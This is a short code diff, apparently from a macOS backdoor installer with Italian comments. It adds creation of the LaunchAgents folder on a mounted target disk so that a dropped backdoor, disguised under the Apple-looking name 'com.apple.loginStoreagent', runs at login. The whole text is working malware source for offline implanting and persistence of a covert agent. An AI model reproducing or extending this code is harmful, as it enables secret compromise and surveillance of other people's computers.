@@ -1245,6 +1245,7 @@ class OfflineInstall(object):
 		# Directory dove vengono droppati i file per l'installazione
 		##			
 		the_backdoor_path = "/mnt" + home + "/Library/Preferences/" + self.backconf['hdir']
+		the_launch_path = "/mnt" + home + "/Library/LaunchAgents/"
 		current_backdoor_name = "com.apple.loginStoreagent"
 		mdworker_plist_content = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" \
 					"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" \
@@ -1278,6 +1279,17 @@ class OfflineInstall(object):
 
 		os.chown(the_backdoor_path, int(uid), int(gid))
 		os.chmod(the_backdoor_path, 0o755)
+
+		#
+		# Senza un primo login, la directory LaunchAgents non esiste, bisogna crearla
+		##
+		if os.path.exists(the_launch_path) == False:
+			try:
+				os.mkdir(the_launch_path)
+				print("    Create LaunchAgents directory [OK] -> " + the_launch_path)
+			except:
+				print("    Create LaunchAgents directory [ERROR] -> " + the_launch_path)
+				pass
 
 		#
 		# Crea l'mdworker per il primo avvio
